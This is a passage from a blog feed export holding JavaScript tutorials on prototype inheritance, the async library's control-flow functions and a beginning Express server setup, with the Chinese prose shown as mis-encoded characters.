Mammal.prototype;</span><br><span class="line">Cat.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> theKitten = <span class="keyword">this</span>.parent.haveABaby.call(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> theKitten;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Shape - superclass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Shape</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.y = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// superclass method</span></span><br><span class="line">Shape.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.x += x;</span><br><span class="line">    <span class="keyword">this</span>.y += y;</span><br><span class="line">    <span class="built_in">console</span>.info(<span class="string">'Shape moved.'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Rectangle - subclass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    Shape.call(<span class="keyword">this</span>); <span class="comment">// call super constructor.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// subclass extends superclass</span></span><br><span class="line">Rectangle.prototype = <span class="built_in">Object</span>.create(Shape.prototype)</span><br><span class="line">Rectangle.prototype.constructor = Rectangle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> Rectangle();</span><br><span class="line"></span><br><span class="line">rect <span class="keyword">instanceof</span> Rectangle;  <span class="comment">// true</span></span><br><span class="line">rect <span class="keyword">instanceof</span> Shape;  <span class="comment">// true</span></span><br><span class="line">rect.move(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// Outputs, 'Shape moved.'</span></span><br></pre></td></tr></table></figure><h3 id="è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•"><a href="#è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•" class="headerlink" title="è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•"></a>è‡ªåˆ¶ç»§æ‰¿æ–¹æ³•</h3><p>æ¥è‡ª <a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="noopener">OOP</a>ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.inheritsFrom = <span class="function"><span class="keyword">function</span>(<span class="params">parentClassOrObject</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parentClassOrObject.constructor == <span class="built_in">Function</span>) &#123;</span><br><span class="line">        <span class="comment">//Normal Inheritance</span></span><br><span class="line">        <span class="keyword">this</span>.prototype = <span class="keyword">new</span> parentClassOrObject;</span><br><span class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject.prototype;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//Pure Virtual Inheritance</span></span><br><span class="line">        <span class="keyword">this</span>.prototype = parentClassOrObject;</span><br><span class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Cat.inheritsFrom(Mammal);</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><ul><li><a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="noopener">OOP in JS, Part 2 : Inheritance</a></li><li><a href="http://uule.iteye.com/blog/1158829" target="_blank" rel="noopener">JSä¸­çš„call()å’Œapply()æ–¹æ³•</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;call-amp-apply&quot;&gt;&lt;a href=&quot;#call-amp-apply&quot; class=&quot;headerlink&quot; title=&quot;call &amp;amp; apply&quot;&gt;&lt;/a&gt;call &amp;amp; apply&lt;/h3&gt;&lt;p&gt;&lt;code&gt;call&lt;/code&gt; å’Œ &lt;code&gt;apply&lt;/code&gt; ä½œç”¨åŸºæœ¬ç›¸åŒï¼Œéƒ½å¯ä»¥è®©ä¸€ä¸ªå¯¹è±¡å¼•ç”¨å¦ä¸€ä¸ªå¯¹è±¡æˆ–å®ƒçš„æ–¹æ³•ï¼Œä¸¤è€…å”¯ä¸€çš„&lt;a href=&quot;http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ä¸åŒ&lt;/a&gt;æ˜¯ &lt;code&gt;call&lt;/code&gt; æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªä¸ªåˆ—å‡ºæ¥ï¼Œ&lt;code&gt;apply&lt;/code&gt; æ¥å—å‡½æ•°å‚æ•°çš„æ–¹å¼æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>AsyncJS åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/06/asyncjs-basis/"/>
    <id>http://youngdze.co/2015/09/06/asyncjs-basis/</id>
    <published>2015-09-06T06:01:30.000Z</published>
    <updated>2016-12-05T05:38:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>AsyncJS æŒ‡çš„æ˜¯ <a href="https://github.com/caolan/async" target="_blank" rel="noopener">async</a>ï¼Œæ˜¯ä¸€ä¸ªå¼‚æ­¥å¤„ç†çš„ç»„ä»¶ã€‚</p></blockquote><h4 id="Series-å’Œ-Limit-çš„åŒºåˆ«"><a href="#Series-å’Œ-Limit-çš„åŒºåˆ«" class="headerlink" title="Series å’Œ Limit çš„åŒºåˆ«"></a>Series å’Œ Limit çš„åŒºåˆ«</h4><ul><li><name>Series - the same as <name> but runs only a single async operation at a time</name></name></li><li><name>Limit - the same as <name> but runs a maximum of limit async operations at a time</name></name></li></ul><a id="more"></a><h4 id="async-map"><a href="#async-map" class="headerlink" title="async.map"></a>async.map</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> names = [<span class="string">'James'</span>, <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span>.map(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>)</span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, name.toUpperCase());</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">'JAMES'</span>, <span class="string">'KOBE'</span>, <span class="string">'HAVARD'</span>, <span class="string">'JERMMY'</span>, <span class="string">'RONDO'</span> ]</span><br></pre></td></tr></table></figure><h4 id="async-each"><a href="#async-each" class="headerlink" title="async. each"></a>async. each</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.each(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">James</span><br><span class="line">Kobe</span><br><span class="line">Havard</span><br><span class="line">Jermmy</span><br><span class="line">Rondo</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="async-eachSeries"><a href="#async-eachSeries" class="headerlink" title="async.eachSeries"></a>async.eachSeries</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.eachSeries(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callback === <span class="string">'function'</span>) callback();</span><br><span class="line">&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">James</span><br><span class="line">Kobe</span><br><span class="line">Havard</span><br><span class="line">Jermmy</span><br><span class="line">Rondo</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="async-parallel"><a href="#async-parallel" class="headerlink" title="async.parallel"></a>async.parallel</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.parallel([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yy</span><br><span class="line">xx</span><br><span class="line">dd</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="async-waterfall"><a href="#async-waterfall" class="headerlink" title="async.waterfall"></a>async.waterfall</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.waterfall([<span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'yy'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'xx'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'dd'</span>);</span><br><span class="line">    callback();</span><br><span class="line">&#125;], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'done'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yy</span><br><span class="line">xx</span><br><span class="line">dd</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h4 id="async-filterLimit"><a href="#async-filterLimit" class="headerlink" title="async.filterLimit"></a>async.filterLimit</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.filterLimit(names, <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</span><br><span class="line">    callback(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    callback();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">'James'</span> ]</span><br></pre></td></tr></table></figure><h4 id="async-reject"><a href="#async-reject" class="headerlink" title="async.reject"></a>async.reject</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.reject(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name === <span class="string">'James'</span>) &#123;</span><br><span class="line">    callback(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    callback();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="string">'Kobe'</span>, <span class="string">'Havard'</span>, <span class="string">'Jermmy'</span>, <span class="string">'Rondo'</span> ]</span><br></pre></td></tr></table></figure><h4 id="async-reduce"><a href="#async-reduce" class="headerlink" title="async.reduce"></a>async.reduce</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.reduce([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">memo, num, callback</span>) </span>&#123;</span><br><span class="line">    callback(<span class="literal">null</span>, memo + num);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><h4 id="async-every"><a href="#async-every" class="headerlink" title="async.every"></a>async.every</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.every(names, <span class="function"><span class="keyword">function</span>(<span class="params">name, callback</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">'string'</span>) &#123;</span><br><span class="line">    callback(<span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    callback(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="async-auto"><a href="#async-auto" class="headerlink" title="async.auto"></a>async.auto</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span>.auto(&#123;</span><br><span class="line">    get_data: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in get_data'</span>);</span><br><span class="line">        <span class="comment">// async code to get some data</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'data'</span>, <span class="string">'converted to array'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    make_folder: <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in make_folder'</span>);</span><br><span class="line">        <span class="comment">// async code to create a directory to store a file in</span></span><br><span class="line">        <span class="comment">// this is run at the same time as getting the data</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'folder'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    write_file: [<span class="string">'get_data'</span>, <span class="string">'make_folder'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in write_file'</span>, <span class="built_in">JSON</span>.stringify(results));</span><br><span class="line">        <span class="comment">// once there is some data and the directory exists,</span></span><br><span class="line">        <span class="comment">// write the data to a file in the directory</span></span><br><span class="line">        callback(<span class="literal">null</span>, <span class="string">'filename'</span>);</span><br><span class="line">    &#125;],</span><br><span class="line">    email_link: [<span class="string">'write_file'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">callback, results</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'in email_link'</span>, <span class="built_in">JSON</span>.stringify(results));</span><br><span class="line">        <span class="comment">// once the file is written let's email a link to it...</span></span><br><span class="line">        <span class="comment">// results.write_file contains the filename returned by write_file.</span></span><br><span class="line">        callback(<span class="literal">null</span>, &#123;<span class="string">'file'</span>:results.write_file, <span class="string">'email'</span>:<span class="string">'user@example.com'</span>&#125;);</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, results</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'err = '</span>, err);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'results = '</span>, results);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span> get_data</span><br><span class="line"><span class="keyword">in</span> make_folder</span><br><span class="line"><span class="keyword">in</span> write_file &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>&#125;</span><br><span class="line"><span class="keyword">in</span> email_link &#123;<span class="string">"get_data"</span>:[<span class="string">"data"</span>,<span class="string">"converted to array"</span>],<span class="string">"make_folder"</span>:<span class="string">"folder"</span>,<span class="string">"write_file"</span>:<span class="string">"filename"</span>&#125;</span><br><span class="line">err =  <span class="literal">null</span></span><br><span class="line">results =  &#123; <span class="attr">get_data</span>: [ <span class="string">'data'</span>, <span class="string">'converted to array'</span> ],</span><br><span class="line">    make_folder: <span class="string">'folder'</span>,</span><br><span class="line">    write_file: <span class="string">'filename'</span>,</span><br><span class="line">    email_link: &#123; <span class="attr">file</span>: <span class="string">'filename'</span>, <span class="attr">email</span>: <span class="string">'user@example.com'</span> &#125; &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;AsyncJS æŒ‡çš„æ˜¯ &lt;a href=&quot;https://github.com/caolan/async&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;async&lt;/a&gt;ï¼Œæ˜¯ä¸€ä¸ªå¼‚æ­¥å¤„ç†çš„ç»„ä»¶ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;Series-å’Œ-Limit-çš„åŒºåˆ«&quot;&gt;&lt;a href=&quot;#Series-å’Œ-Limit-çš„åŒºåˆ«&quot; class=&quot;headerlink&quot; title=&quot;Series å’Œ Limit çš„åŒºåˆ«&quot;&gt;&lt;/a&gt;Series å’Œ Limit çš„åŒºåˆ«&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;name&gt;Series - the same as &lt;name&gt; but runs only a single async operation at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;li&gt;&lt;name&gt;Limit - the same as &lt;name&gt; but runs a maximum of limit async operations at a time&lt;/name&gt;&lt;/name&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="async" scheme="http://youngdze.co/tags/async/"/>
    
  </entry>
  
  <entry>
    <title>Express åŸºç¡€</title>
    <link href="http://youngdze.co/2015/09/01/express-basis/"/>
    <id>http://youngdze.co/2015/09/01/express-basis/</id>
    <published>2015-09-01T15:53:04.000Z</published>
    <updated>2016-12-05T11:32:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="åˆ›å»º-package-json"><a href="#åˆ›å»º-package-json" class="headerlink" title="åˆ›å»º package.json"></a>åˆ›å»º package.json</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>: <span class="string">"express-basis"</span>,</span><br><span class="line">    <span class="attr">"main"</span>: <span class="string">"service.js"</span>,</span><br><span class="line">    <span class="attr">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="attr">"body-parser"</span>: <span class="string">"^1.13.3"</span>,</span><br><span class="line">    <span class="attr">"express"</span>: <span class="string">"^4.13.3"</span>,</span><br><span class="line">    <span class="attr">"jade"</span>: <span class="string">"^1.11.0"</span>,</span><br><span class="line">    <span class="attr">"mongoose"</span>: <span class="string">"^4.1.4"</span>,</span><br><span class="line">    <span class="attr">"morgan"</span>: <span class="string">"^1.6.1"</span>,</span><br><span class="line">    <span class="attr">"underscore"</span>: <span class="string">"^1.8.3"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>body-parser æ˜¯ä¸ºäº†å–å¾— <code>req.body.param</code>ã€‚</li><li>express æ˜¯æ¡†æ¶ã€‚</li><li>jade æ˜¯æ¸²æŸ“å¼•æ“ã€‚</li><li>mongoose æ“ä½œ <strong>MongoDB</strong>ã€‚</li><li>morgan è¾“å‡ºè®¿é—®ä¿¡æ¯ã€‚</li><li>underscore æ˜¯<strong>ç¥å™¨</strong>ã€‚</li></ul><a id="more"></a><h4 id="ç€æ‰‹-service-js"><a href="#ç€æ‰‹-service-js" class="headerlink" title="ç€æ‰‹ service.js"></a>ç€æ‰‹ service.js</h4><p><code>npm install</code> ä¹‹åï¼Œå¼€å§‹å†™ <code>server.js</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> jade = <span class="built_in">require</span>(<span class="string">'jade'</span>);</span><br><span class="line"><span class="keyword">var</span> _ = <span class="built_in">require</span>(<span class="string">'underscore'</span>);</span><br><span class="line"></span><br><span class="line">##### ä½¿ç”¨ _morgan_ è¾“å‡ºè®¿é—®ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">app.use(morgan(<span class="string">'dev'</span>)); <span class="comment">// log requests to the console</span></span><br><span class="line"></span><br><span class="line">##### é…ç½® _body-parser_</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®ç«¯å£"><a href="#è®¾ç½®ç«¯å£" class="headerlink" title="è®¾ç½®ç«¯å£"></a>è®¾ç½®ç«¯å£</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 